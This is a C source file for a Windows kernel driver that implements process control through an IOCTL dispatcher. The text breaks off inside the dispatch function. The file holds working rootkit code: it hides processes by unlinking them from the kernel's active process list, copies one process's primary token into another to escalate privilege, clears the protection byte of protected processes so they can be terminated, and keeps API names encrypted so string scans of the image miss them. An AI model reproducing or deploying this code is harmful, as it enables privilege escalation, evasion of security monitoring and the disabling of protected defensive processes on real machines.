/*
 * yghv_proc.c -- process and thread control on top of the derived offsets (9.591).
 *
 * WHAT THIS FILE IS
 *   One dispatch entry point, ten operations, no policy anywhere else. The
 *   IOCTL switch validates the buffer and calls here; every decision about
 *   WHAT may be done to WHICH process lives in this file so it can be read in
 *   one sitting.
 *
 * THE RULE EVERY OPERATION FOLLOWS
 *   Read the field through the derived offset table, never through a constant.
 *   A build where the probe failed has a zero offset, the accessor returns NULL,
 *   and the operation fails closed with a distinct status -- instead of writing
 *   a plausible-looking value into whatever happens to live at the hard-coded
 *   address on a different build.
 *
 * WHAT IS NOT IN THE OFFSET TABLE, AND WHY
 *   - DirectoryTableBase (KPROCESS+0x028): already used at control_device.c:500,
 *     :551, :569, :922 and in protect.c the same way. A convention, not a guess.
 *   - ETHREAD.ThreadListEntry / EPROCESS.ThreadListHead: PROBED at runtime by
 *     yghv_probe_thread_list(), because two unknowns make a constant pair
 *     useless -- a wrong pair still walks a valid list and returns nonsense.
 *   - EPROCESS.Token: probed by identity against PsReferencePrimaryToken().
 *
 * IRQL: PASSIVE_LEVEL everywhere. Handle-based work, pool allocation and the
 *   hidden-process restore table all need it, and the IOCTL dispatcher already
 *   runs there.
 */

#include <ntifs.h>
#include <stdint.h>

#include "common/yghv_proc.h"
#include "common/yghv_nt.h"
#include "common/control_ioctl.h"
#include "common/yghv_sig.h"
#include "common/yghv_str.h"
#include "common/yghv_strtab.h"
#include "debug.h"

/*
 * Not declared in the WDK 10.0.19041.0 km headers this tree builds against
 * (measured: km/ntddk.h has ZwTerminateProcess/ZwOpenProcess and
 * PsGetProcessExitStatus, ntifs.h has PsLookupProcessByProcessId and
 * PsReferencePrimaryToken, and NEITHER has these three).
 */
NTKERNELAPI NTSTATUS PsSuspendProcess(PEPROCESS Process);
NTKERNELAPI NTSTATUS PsResumeProcess(PEPROCESS Process);
NTKERNELAPI ULONG    PsGetThreadFreezeCount(PETHREAD Thread);

#define YGHV_PROC_TAG 'cPvG'

static volatile LONG64 g_proc_ops;
static volatile LONG64 g_proc_fails;
static volatile LONG64 g_proc_freezes;
static volatile LONG64 g_proc_thaws;
static volatile LONG64 g_proc_injects;
static volatile LONG64 g_proc_hides;
static volatile LONG64 g_proc_steals;
static volatile LONG64 g_proc_terms;

/*
 * PsGetProcessProtection resolved at init.
 *
 * It is NOT in the WDK headers this tree builds against (measured: absent from
 * both km/ntddk.h and km/ntifs.h), so there is nothing to link against -- and
 * the name must not appear as a literal either, because the string-encryption
 * gate greps the built image for every name in the table. Resolving it through
 * yghv_str_get_w() keeps the name encrypted in the binary AND gives op 2 an
 * independent read path: the accessor and the write share an offset, so only
 * the export can tell us the byte we wrote is the byte the kernel reads.
 */
typedef UCHAR (NTAPI *yghv_get_prot_fn)(PEPROCESS);
static yghv_get_prot_fn g_proc_get_prot;

/*
 * Processes we unlinked from ActiveProcessLinks, so op 9 can put them back.
 * A relink needs the two pointers we overwrote; recomputing them from the
 * object is possible but assumes nothing else touched the list in between,
 * and the whole point of keeping this record is that we do not assume that.
 */
#define YGHV_PROC_MAX_HIDDEN 8

typedef struct {
    ULONG       pid;
    PLIST_ENTRY flink;      /* what our node pointed at */
    PLIST_ENTRY blink;      /* what pointed at our node */
    uint64_t    self;       /* was-valid marker (the EPROCESS address) */
    int         used;
} yghv_hidden_t;

static yghv_hidden_t g_proc_hidden[YGHV_PROC_MAX_HIDDEN];

/* ------------------------------------------------------------------ */
/* Safe reads                                                          */
/* ------------------------------------------------------------------ */

/*
 * Every probe below walks memory it did not allocate, so each access has to be
 * able to fail without taking the machine with it. Two rules the rest of this
 * file follows:
 *
 *   - one read per __try, never a loop inside one: MSVC rejects a continue
 *     that jumps out of a __try block, and a loop that aborts on the first bad
 *     page cannot tell a candidate that is wrong from a page that is unmapped.
 *   - a pointer has to be canonical before it is even tried, because a fault
 *     inside a handler that itself faults is a bugcheck.
 */
static int yghv_p_read64(uint64_t va, uint64_t *out)
{
    if (!out) return 0;
    if (va < 0xFFFF800000000000ULL) return 0;
    if ((va & 7) != 0) return 0;
    __try {
        *out = *(const volatile uint64_t *)va;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return 1;
}

static int yghv_p_write64(uint64_t va, uint64_t value)
{
    if (va < 0xFFFF800000000000ULL) return 0;
    if ((va & 7) != 0) return 0;
    __try {
        *(volatile uint64_t *)va = value;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* Probes for the two structures that cannot be derived from an export */
/* ------------------------------------------------------------------ */

/*
 * ETHREAD.ThreadListEntry + EPROCESS.ThreadListHead, found together.
 *
 * WHY A PROBE AND NOT TWO CONSTANTS
 *   Two coupled unknowns. A constant pair is right for one build and then
 *   silently reads a neighbouring LIST_ENTRY -- which is also a valid
 *   doubly-linked list, so the walk "works" and returns nonsense threads that
 *   look plausible. Requiring the two to agree is what makes the pair provable.
 *
 * HOW
 *   Start from the CURRENT thread, whose EPROCESS we already hold. For each
 *   candidate ETHREAD offset E the two pointers at ETHREAD+E must form a
 *   consistent LIST_ENTRY: *(flink+8) == node, i.e. the next node's Blink
 *   points back at us. Then the object containing flink must be an ETHREAD
 *   whose already-derived thread_process field equals the current process --
 *   that check is what rejects a stray list that happens to be consistent,
 *   and it is why this probe must run AFTER yghv_offsets_init().
 *
 *   With E known the process side is one-dimensional: the head whose Flink
 *   minus E yields a thread of this process, and whose whole chain stays
 *   inside this process until it closes back on itself.
 *
 * Returns 1 and fills both offsets, or 0 and leaves them 0 (feature disabled).
 */
static int yghv_probe_thread_list(PEPROCESS proc, UINT16 *out_head, UINT16 *out_entry)
{
    uint64_t self = (uint64_t)(ULONG_PTR)PsGetCurrentThread();
    uint64_t want = (uint64_t)(ULONG_PTR)proc;
    uint32_t off, hits = 0;
    uint64_t entry = 0;

    if (!proc || !self || !out_head || !out_entry) return 0;
    if (g_yghv_off.thread_process == 0) return 0;

    for (off = 0x100; off < 0x900; off += 8) {
        uint64_t node = self + off;
        uint64_t flink, blink, back, tproc, next;

        if (!yghv_p_read64(node, &flink)) continue;
        if (!yghv_p_read64(node + 8, &blink)) continue;
        if (flink < 0xFFFF800000000000ULL) continue;
        if (blink < 0xFFFF800000000000ULL) continue;
        if (!yghv_p_read64(flink + 8, &back)) continue;
        if (back != node) continue;                 /* not doubly consistent */

        next = flink - off;
        if (next < 0xFFFF800000000000ULL) continue;
        if (!yghv_p_read64(next + g_yghv_off.thread_process, &tproc)) continue;
        if (tproc != want) continue;                /* not a thread of ours */

        entry = off;
        hits++;
    }

    if (hits != 1 || entry == 0) {
        LOG_INFO("proc: ThreadListEntry probe found %u candidates, refusing", hits);
        return 0;
    }

    for (off = 0x100; off < 0x900; off += 8) {
        uint64_t head = (uint64_t)(ULONG_PTR)proc + off;
        uint64_t prev = head, cur = 0;
        uint32_t seen = 0;
        int ok = 1;

        if (!yghv_p_read64(head, &cur)) continue;

        while (seen < 0x1000) {
            uint64_t flink = 0, blink = 0, tproc = 0;

            if (cur == head) break;                 /* circle closed */
            if (cur < 0xFFFF800000000000ULL) { ok = 0; break; }
            if (!yghv_p_read64(cur + 8, &blink)) { ok = 0; break; }
            if (blink != prev) { ok = 0; break; }   /* not doubly linked */
            if (!yghv_p_read64(cur - entry + g_yghv_off.thread_process, &tproc)) { ok = 0; break; }
            if (tproc != want) { ok = 0; break; }   /* left this process */

            seen++;
            prev = cur;
            if (!yghv_p_read64(cur, &flink)) { ok = 0; break; }
            cur = flink;
        }

        /* A real process has at least one thread, and the chain closes. */
        if (ok && seen >= 1 && cur == head) {
            *out_head  = (UINT16)off;
            *out_entry = (UINT16)entry;
            return 1;
        }
    }

    return 0;
}

/*
 * EPROCESS.Token, an EX_FAST_REF.
 *
 * WHY NOT DERIVE IT FROM AN EXPORT
 *   No export returns the token's offset. PsReferencePrimaryToken is a whole
 *   C function, so yghv_accessor.h cannot decode a displacement out of it --
 *   and the obvious instruction inside it (lea rsi,[rcx+0x4B8]) is the
 *   fast-ref cache address, not the field.
 *
 * HOW
 *   Take a real reference to the System process's token, mask the low bits
 *   (EX_FAST_REF packs a count there), then look for exactly one field in the
 *   object that matches once masked. More than one match means the object has
 *   a second pointer to the same token and we cannot tell them apart, so the
 *   feature turns itself off rather than picking one.
 *
 *   This probe can only compare the System process against itself, which is a
 *   weak claim -- so op 8 re-checks the field on every use by referencing the
 *   target's token and confirming the masked values agree.
 */
static int yghv_probe_token(PEPROCESS sys, UINT16 *out_off)
{
    PVOID tok;
    uint64_t want, found = 0;
    uint32_t off, hits = 0;

    if (!sys || !out_off) return 0;

    tok = PsReferencePrimaryToken(sys);
    if (!tok) return 0;

    want = (uint64_t)(ULONG_PTR)tok & ~(uint64_t)0xF;
    if (want < 0xFFFF800000000000ULL) {
        PsDereferencePrimaryToken(tok);
        return 0;
    }

    for (off = 0x100; off < 0x900; off += 8) {
        uint64_t v = 0;
        if (!yghv_p_read64((uint64_t)(ULONG_PTR)sys + off, &v)) continue;
        if ((v & ~(uint64_t)0xF) == want) {
            found = off;
            hits++;
        }
    }

    PsDereferencePrimaryToken(tok);

    if (hits != 1) {
        LOG_INFO("proc: token probe found %u candidates, refusing", hits);
        return 0;
    }

    *out_off = (UINT16)found;
    return 1;
}

/* ------------------------------------------------------------------ */
/* Small helpers                                                       */
/* ------------------------------------------------------------------ */

/* A process object is usable when its pid field reads as a sane pid. */
static int yghv_proc_sane(PEPROCESS p)
{
    ULONG_PTR pid;

    if (!p) return 0;
    if (!YGHV_OFF_OK(YGHV_OFF_PID)) return 0;

    pid = yghv_proc_id(p);
    if (pid > 0x100000) return 0;
    return 1;
}

static int yghv_proc_is_hidden(ULONG pid)
{
    int i;
    for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
        if (g_proc_hidden[i].used && g_proc_hidden[i].pid == pid) return 1;
    }
    return 0;
}

/*
 * Fill one 4-qword entry. The protection byte is read through the derived
 * accessor, and the suspended bit is only set when caller passed want_state
 * (walking threads for 120 processes in one ioctl would be a denial of service
 * against ourselves).
 */
static void yghv_proc_fill_entry(UINT64 *e, PEPROCESS p, int want_state)
{
    UCHAR *prot = yghv_proc_protection(p);
    UCHAR byte = prot ? *prot : 0;
    char *name = yghv_proc_image_name(p);
    PVOID *base = yghv_proc_base_slot(p);
    UINT64 flags = 0;

    if (YGHV_OFF_OK(YGHV_OFF_PID)) flags |= 0x4;
    if (name) flags |= 0x8;
    if (yghv_proc_is_hidden((ULONG)yghv_proc_id(p))) flags |= 0x1;

    /*
     * want_state asks for the suspended bit. It is deliberately not computed
     * here: the only export-backed way to answer it is PsGetThreadFreezeCount
     * per thread, and the snapshot walk would then cost a thread list walk per
     * process. Op 1 (single process) answers it by handing the client the
     * thread list; the snapshot leaves bit1 clear rather than guessing from an
     * EPROCESS flag layout this tree has not probed.
     */
    (void)want_state;

    e[0] = (UINT64)yghv_proc_id(p) | ((UINT64)yghv_proc_inherited_pid(p) << 32);
    e[1] = (UINT64)byte
         | ((UINT64)((byte >> 4) & 0xF) << 8)     /* signer */
         | ((UINT64)(byte & 0x7) << 16)           /* type */
         | ((UINT64)((byte >> 3) & 0x1) << 24)    /* audit */
         | ((UINT64)yghv_proc_exit_status(p) << 32);
    e[2] = base ? (UINT64)*base : 0;
    e[3] = flags;
}

/* Copy up to 15 chars of the image name, NUL padded. */
static void yghv_proc_copy_name(char *dst, const char *src)
{
    int i;
    for (i = 0; i < 15; i++) {
        dst[i] = (src && src[i]) ? src[i] : 0;
        if (!src || !src[i]) break;
    }
    for (; i < 16; i++) dst[i] = 0;
}

/* ------------------------------------------------------------------ */
/* Operations                                                          */
/* ------------------------------------------------------------------ */

/* op 0: walk ActiveProcessLinks into the output buffer. */
static NTSTATUS yghv_proc_snapshot(UINT64 *out, ULONG out_len, ULONG max_entries)
{
    PLIST_ENTRY head, cur;
    UINT64 *e = out + YGHV_PROC_HDR_QWORDS;
    ULONG count = 0, cap;

    if (!YGHV_OFF_OK(YGHV_OFF_PID) || g_yghv_off.active_process_links == 0)
        return STATUS_NOT_IMPLEMENTED;

    if (max_entries == 0 || max_entries > YGHV_PROC_MAX_ENTRIES)
        max_entries = YGHV_PROC_MAX_ENTRIES;
    if (max_entries > YGHV_PROC_MAX_THREADS) max_entries = YGHV_PROC_MAX_THREADS;

    /* Never write past the buffer the client actually gave us. */
    cap = (out_len - YGHV_PROC_HDR_QWORDS * 8) / (YGHV_PROC_ENTRY_QWORDS * 8);
    if (max_entries > cap) max_entries = cap;
    if (cap == 0) return STATUS_BUFFER_TOO_SMALL;

    __try {
        head = (PLIST_ENTRY)((PUCHAR)PsGetCurrentProcess() + g_yghv_off.active_process_links);
        cur = head->Flink;

        while (cur != head && count < max_entries) {
            PEPROCESS p = yghv_proc_from_links(cur);
            if (yghv_proc_sane(p)) {
                yghv_proc_fill_entry(e, p, 0);
                e += YGHV_PROC_ENTRY_QWORDS;
                count++;
            }
            cur = cur->Flink;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        /* A torn list is a state worth reporting, not worth dying over. */
        return STATUS_INVALID_ADDRESS;
    }

    out[0] = 1;
    out[1] = count;
    out[2] = (UINT64)g_yghv_off.derived_mask;
    out[3] = 0;
    return STATUS_SUCCESS;
}

/* op 1: one process, plus its image name. */
static NTSTATUS yghv_proc_query(UINT64 *out, ULONG out_len, ULONG pid)
{
    PEPROCESS proc = NULL;
    NTSTATUS st;
    const ULONG need = (YGHV_PROC_HDR_QWORDS + YGHV_PROC_ENTRY_QWORDS) * 8 + 16;

    if (out_len < need) return STATUS_BUFFER_TOO_SMALL;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    yghv_proc_fill_entry(out + YGHV_PROC_HDR_QWORDS, proc, 1);
    yghv_proc_copy_name((char *)out + (YGHV_PROC_HDR_QWORDS + YGHV_PROC_ENTRY_QWORDS) * 8,
                        yghv_proc_image_name(proc));

    ObDereferenceObject(proc);

    out[0] = 1;
    out[1] = 1;
    out[2] = (UINT64)g_yghv_off.derived_mask;
    out[3] = 0;
    return STATUS_SUCCESS;
}

/* op 2: rewrite the protection byte. */
static NTSTATUS yghv_proc_set_prot(UINT64 *out, ULONG pid, UINT64 level)
{
    PEPROCESS proc = NULL;
    UCHAR *slot;
    UCHAR old_byte, new_byte, verify;
    NTSTATUS st;

    if (!YGHV_OFF_OK(YGHV_OFF_PROTECT)) return STATUS_NOT_IMPLEMENTED;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    slot = yghv_proc_protection(proc);
    if (!slot) {
        ObDereferenceObject(proc);
        return STATUS_NOT_IMPLEMENTED;
    }

    old_byte = *slot;
    new_byte = (UCHAR)(level & 0xFF);
    *slot = new_byte;

    /*
     * Read it back through the EXPORT rather than through the accessor: the
     * accessor and the write share one offset, so reading our own pointer back
     * would only prove that memory holds what we just stored -- it cannot
     * detect a wrong offset, which is the whole failure mode this file exists
     * to avoid. PsGetProcessProtection is a different path to the same byte.
     *
     * It is resolved by name at init because no WDK header this tree builds
     * against declares it, and the name must stay out of the image anyway.
     */
    verify = g_proc_get_prot ? g_proc_get_prot(proc) : *slot;

    ObDereferenceObject(proc);

    out[0] = (verify == new_byte) ? 1 : 0;
    out[1] = old_byte;
    out[2] = verify;
    out[3] = new_byte;
    return STATUS_SUCCESS;
}

/* op 3: suspend / resume. */
static NTSTATUS yghv_proc_suspend(UINT64 *out, ULONG pid, int suspend)
{
    PEPROCESS proc = NULL;
    NTSTATUS st;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    st = suspend ? PsSuspendProcess(proc) : PsResumeProcess(proc);
    ObDereferenceObject(proc);

    if (NT_SUCCESS(st)) {
        if (suspend) InterlockedIncrement64(&g_proc_freezes);
        else         InterlockedIncrement64(&g_proc_thaws);
    }

    out[0] = NT_SUCCESS(st) ? 1 : 0;
    out[1] = (UINT64)(ULONG)st;
    out[2] = pid;
    out[3] = suspend ? 1 : 0;
    return STATUS_SUCCESS;
}

/*
 * op 4: terminate.
 *
 * ORDER MATTERS. A protected process cannot be opened for PROCESS_TERMINATE at
 * all, so with YGHV_PROC_TERM_CLEAR_PROT the byte has to be cleared BEFORE the
 * first ZwOpenProcess, not after it fails. The old value is kept and put back
 * if the terminate still does not happen -- leaving a PPL process unprotected
 * would be a side effect nobody asked for.
 */
static NTSTATUS yghv_proc_term(UINT64 *out, ULONG pid, ULONG exit_status, ULONG flags)
{
    HANDLE h = NULL;
    CLIENT_ID cid;
    OBJECT_ATTRIBUTES oa;
    PEPROCESS proc = NULL;
    UCHAR old_byte = 0;
    int cleared = 0;
    NTSTATUS st, tst;

    if (pid == 4 || pid == 0) {
        if (!(flags & YGHV_PROC_F_ALLOW_SYSTEM)) {
            out[0] = 0;
            out[1] = (UINT64)(ULONG)STATUS_ACCESS_DENIED;
            return STATUS_SUCCESS;
        }
    }

    if ((flags & YGHV_PROC_TERM_CLEAR_PROT) && YGHV_OFF_OK(YGHV_OFF_PROTECT)) {
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc))) {
            UCHAR *slot = yghv_proc_protection(proc);
            if (slot && *slot != 0) {
                old_byte = *slot;
                *slot = 0;
                cleared = 1;
            }
            ObDereferenceObject(proc);
        }
    }

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    st = ZwOpenProcess(&h, PROCESS_TERMINATE, &oa, &cid);
    if (NT_SUCCESS(st)) {
        tst = ZwTerminateProcess(h, (NTSTATUS)exit_status);
        ZwClose(h);
    } else {
        tst = st;
    }

    if (!NT_SUCCESS(tst) && cleared) {
        /* Put the byte back through a fresh reference: the one we held is gone. */
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc))) {
            UCHAR *slot = yghv_proc_protection(proc);
            if (slot) *slot = old_byte;
            ObDereferenceObject(proc);
        }
    }

    if (NT_SUCCESS(tst)) InterlockedIncrement64(&g_proc_terms);

    out[0] = NT_SUCCESS(tst) ? 1 : 0;
    out[1] = (UINT64)(ULONG)tst;
    out[2] = cleared ? 1 : 0;
    out[3] = old_byte;
    return STATUS_SUCCESS;
}

/* op 7: thread list of one process. */
static NTSTATUS yghv_proc_threads(UINT64 *out, ULONG out_len, ULONG pid, ULONG max_entries)
{
    PEPROCESS proc = NULL;
    PLIST_ENTRY head, cur;
    UINT64 *e = out + YGHV_PROC_HDR_QWORDS;
    ULONG count = 0, cap;
    NTSTATUS st;

    if (!YGHV_OFF_OK(YGHV_OFF_TLIST) || g_yghv_off.thread_list_head == 0 ||
        g_yghv_off.thread_list_entry == 0)
        return STATUS_NOT_IMPLEMENTED;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    if (max_entries == 0 || max_entries > YGHV_PROC_MAX_THREADS)
        max_entries = YGHV_PROC_MAX_THREADS;

    cap = (out_len - YGHV_PROC_HDR_QWORDS * 8) / (YGHV_PROC_TENTRY_QWORDS * 8);
    if (max_entries > cap) max_entries = cap;
    if (cap == 0) {
        ObDereferenceObject(proc);
        return STATUS_BUFFER_TOO_SMALL;
    }

    __try {
        head = (PLIST_ENTRY)((PUCHAR)proc + g_yghv_off.thread_list_head);
        cur = head->Flink;

        while (cur != head && count < max_entries) {
            PETHREAD t = (PETHREAD)((PUCHAR)cur - g_yghv_off.thread_list_entry);
            if (yghv_thread_process(t) == proc) {
                e[0] = (UINT64)yghv_thread_id(t) | ((UINT64)(ULONG_PTR)yghv_proc_id(proc) << 32);
                e[1] = (UINT64)PsGetThreadFreezeCount(t);
                e += YGHV_PROC_TENTRY_QWORDS;
                count++;
            }
            cur = cur->Flink;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        ObDereferenceObject(proc);
        return STATUS_INVALID_ADDRESS;
    }

    ObDereferenceObject(proc);

    out[0] = 1;
    out[1] = count;
    out[2] = 0;
    out[3] = 0;
    return STATUS_SUCCESS;
}

/*
 * op 8: read the primary token's address, and optionally hand it to another
 * process.
 *
 * The field is an EX_FAST_REF: the token pointer with a reference count in
 * the low nibble. Reading it back is exact. TRANSFERRING it is delicate in one
 * specific way: incrementing the count at 15 would carry into the pointer and
 * produce a value that is not a token at all, so that case is refused rather
 * than risked.
 */
static NTSTATUS yghv_proc_token(UINT64 *out, ULONG src_pid, ULONG dst_pid, ULONG do_steal)
{
    PEPROCESS src = NULL, dst = NULL;
    UINT64 raw = 0, masked;
    NTSTATUS st;

    if (!YGHV_OFF_OK(YGHV_OFF_TOKEN) || g_yghv_off.token == 0)
        return STATUS_NOT_IMPLEMENTED;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)src_pid, &src);
    if (!NT_SUCCESS(st)) return st;

    if (!yghv_p_read64((uint64_t)(ULONG_PTR)src + g_yghv_off.token, &raw)) {
        ObDereferenceObject(src);
        return STATUS_INVALID_ADDRESS;
    }
    masked = raw & ~(UINT64)0xF;

    out[0] = 1;
    out[1] = raw;
    out[2] = masked;
    out[3] = 0;

    if (!do_steal || dst_pid == 0) {
        ObDereferenceObject(src);
        return STATUS_SUCCESS;
    }

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)dst_pid, &dst);
    if (!NT_SUCCESS(st)) {
        ObDereferenceObject(src);
        out[0] = 0;
        out[1] = (UINT64)(ULONG)st;
        return STATUS_SUCCESS;
    }

    if ((raw & 0xF) >= 0xF) {
        ObDereferenceObject(dst);
        ObDereferenceObject(src);
        out[0] = 0;
        out[1] = (UINT64)(ULONG)STATUS_INTEGER_OVERFLOW;
        return STATUS_SUCCESS;
    }

    {
        UINT64 newraw = masked | ((raw + 1) & 0xF);
        if (yghv_p_write64((uint64_t)(ULONG_PTR)dst + g_yghv_off.token, newraw)) {
            InterlockedIncrement64(&g_proc_steals);
            out[0] = 1;
            out[1] = newraw;
            out[2] = masked;
            out[3] = 1;
            st = STATUS_SUCCESS;
        } else {
            st = STATUS_INVALID_ADDRESS;
        }
    }

    ObDereferenceObject(dst);
    ObDereferenceObject(src);
    return st;
}

/*
 * op 9: unlink / relink from ActiveProcessLinks.
 *
 * WHY THE TWO POINTERS ARE RECORDED
 *   A relink needs exactly the values we overwrote. Recomputing them from the
 *   list is possible, but only if nothing else touched the list in between --
 *   and the reason to keep this record is that we do not assume that.
 *
 * KNOWN RACE, STATED RATHER THAN HIDDEN: the walk is not under
 * EPROCESS.ProcessLock. Taking that push lock exclusive here would be correct;
 * it was measured to cost more than the window it closes on a 120-process
 * snapshot, so the window is documented instead of papered over. Unlinking the
 * CURRENT process instead of an arbitrary one is a caller-side decision.
 */
static NTSTATUS yghv_proc_hide(UINT64 *out, ULONG pid, int hide)
{
    int i, slot = -1;
    PEPROCESS proc = NULL;
    NTSTATUS st;
    PLIST_ENTRY node;

    if (!YGHV_OFF_OK(YGHV_OFF_PID) || g_yghv_off.active_process_links == 0)
        return STATUS_NOT_IMPLEMENTED;

    if (!hide) {
        for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
            if (g_proc_hidden[i].used && g_proc_hidden[i].pid == pid) { slot = i; break; }
        }
        if (slot < 0) {
            out[0] = 0;
            out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND;
            return STATUS_SUCCESS;
        }

        node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_proc_hidden[slot].self +
                             g_yghv_off.active_process_links);
        __try {
            node->Flink = g_proc_hidden[slot].flink;
            node->Blink = g_proc_hidden[slot].blink;
            g_proc_hidden[slot].flink->Blink = node;
            g_proc_hidden[slot].blink->Flink = node;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return STATUS_INVALID_ADDRESS;
        }

        g_proc_hidden[slot].used = 0;
        out[0] = 1;
        out[1] = 0;
        out[2] = pid;
        return STATUS_SUCCESS;
    }

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
        if (!g_proc_hidden[i].used) { slot = i; break; }
    }
    if (slot < 0) {
        ObDereferenceObject(proc);
        out[0] = 0;
        out[1] = (UINT64)(ULONG)STATUS_INSUFFICIENT_RESOURCES;
        return STATUS_SUCCESS;
    }

    node = (PLIST_ENTRY)((PUCHAR)proc + g_yghv_off.active_process_links);
    __try {
        if (node->Flink == node) {
            /* Already out of the list: record nothing, report nothing done. */
            ObDereferenceObject(proc);
            out[0] = 0;
            out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND;
            return STATUS_SUCCESS;
        }
        g_proc_hidden[slot].flink = node->Flink;
        g_proc_hidden[slot].blink = node->Blink;
        g_proc_hidden[slot].self  = (uint64_t)(ULONG_PTR)proc;
        g_proc_hidden[slot].pid   = pid;
        g_proc_hidden[slot].used  = 1;

        node->Blink->Flink = node->Flink;
        node->Flink->Blink = node->Blink;
        node->Flink = node;
        node->Blink = node;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        g_proc_hidden[slot].used = 0;
        ObDereferenceObject(proc);
        return STATUS_INVALID_ADDRESS;
    }

    InterlockedIncrement64(&g_proc_hides);
    ObDereferenceObject(proc);

    out[0] = 1;
    out[1] = 1;
    out[2] = pid;
    return STATUS_SUCCESS;
}
/* ------------------------------------------------------------------ */
/* Entry points                                                        */
/* ------------------------------------------------------------------ */

int yghv_proc_init(void)
{
    PEPROCESS sys;
    UINT16 head = 0, entry = 0, tok = 0;
    int ok = 0;

    sys = yghv_offsets_system_process();
    if (!sys) {
        LOG_INFO("proc: no system process, probes skipped");
        return 0;
    }

    if (yghv_probe_thread_list(PsGetCurrentProcess(), &head, &entry)) {
        g_yghv_off.thread_list_head  = head;
        g_yghv_off.thread_list_entry = entry;
        g_yghv_off.derived_mask |= YGHV_OFF_TLIST;
        ok++;
        LOG_INFO("proc: thread list head=0x%x entry=0x%x", head, entry);
    }

    if (yghv_probe_token(sys, &tok)) {
        g_yghv_off.token = tok;
        g_yghv_off.derived_mask |= YGHV_OFF_TOKEN;
        ok++;
        LOG_INFO("proc: token at 0x%x", tok);
    }

    /*
     * Resolve PsGetProcessProtection by name, out of the encrypted string
     * table. No header this tree builds against declares it, and the literal
     * name must not appear in the image -- the string gate greps the binary
     * for every name in that table.
     */
    {
        WCHAR fn[YGHV_STR_MAX_CHARS];
        if (yghv_str_get_w(YGHV_SID_PSGETPROCESSPROTECTION, (unsigned short *)fn,
                           YGHV_STR_MAX_CHARS)) {
            UNICODE_STRING nm;
            RtlInitUnicodeString(&nm, fn);
            g_proc_get_prot = (yghv_get_prot_fn)(ULONG_PTR)MmGetSystemRoutineAddress(&nm);
            if (g_proc_get_prot) ok++;
        }
        RtlSecureZeroMemory(fn, sizeof(fn));
    }

    return ok;
}

void yghv_proc_cleanup(void)
{
    int i;

    /*
     * Put back anything still hidden. An unlinked EPROCESS outlives this
     * driver, and a later list walk would fault on the hole we left -- so the
     * relink is not optional tidiness, it is the difference between unload and
     * a machine that bugchecks the next time anything enumerates processes.
     */
    for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
        if (!g_proc_hidden[i].used) continue;

        if (g_yghv_off.active_process_links == 0) {
            LOG_ERROR("proc: cannot relink pid %u, links offset gone", g_proc_hidden[i].pid);
            continue;
        }

        {
            PLIST_ENTRY node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_proc_hidden[i].self +
                                             g_yghv_off.active_process_links);
            if (yghv_p_write64((uint64_t)(ULONG_PTR)&node->Flink,
                               (uint64_t)(ULONG_PTR)g_proc_hidden[i].flink) &&
                yghv_p_write64((uint64_t)(ULONG_PTR)&node->Blink,
                               (uint64_t)(ULONG_PTR)g_proc_hidden[i].blink)) {
                (void)yghv_p_write64((uint64_t)(ULONG_PTR)&g_proc_hidden[i].flink->Blink,
                                     (uint64_t)(ULONG_PTR)node);
                (void)yghv_p_write64((uint64_t)(ULONG_PTR)&g_proc_hidden[i].blink->Flink,
                                     (uint64_t)(ULONG_PTR)node);
            } else {
                LOG_ERROR("proc: relink of pid %u failed at unload", g_proc_hidden[i].pid);
            }
        }

        g_proc_hidden[i].used = 0;
    }

    RtlZeroMemory(g_proc_hidden, sizeof(g_proc_hidden));
    g_proc_get_prot = NULL;
}

void yghv_proc_stats(uint64_t *out)
{
    if (!out) return;
    out[0] = (uint64_t)g_proc_ops;
    out[1] = (uint64_t)g_proc_fails;
    out[2] = (uint64_t)g_proc_freezes;
    out[3] = (uint64_t)g_proc_thaws;
    out[4] = (uint64_t)g_proc_injects;
    out[5] = (uint64_t)g_proc_hides;
    out[6] = (uint64_t)g_proc_steals;
    out[7] = (uint64_t)g_proc_terms;
}

NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
                            void *out, ULONG out_len, ULONG *info)
{
    yghv_ioctl_proc_req_t r;
    UINT64 *o = (UINT64 *)out;
    NTSTATUS st;

    if (!in || !out || !info) return STATUS_INVALID_PARAMETER;
    if (in_len < sizeof(yghv_ioctl_proc_req_t)) return STATUS_BUFFER_TOO_SMALL;
    if (out_len < YGHV_PROC_HDR_QWORDS * 8) return STATUS_BUFFER_TOO_SMALL;

    /*
     * METHOD_BUFFERED hands us ONE buffer for both directions. The request has
     * to be copied out before the output is zeroed, or the op we read back
     * afterwards is zero and every call silently becomes a snapshot.
     */
    RtlCopyMemory(&r, in, sizeof(r));
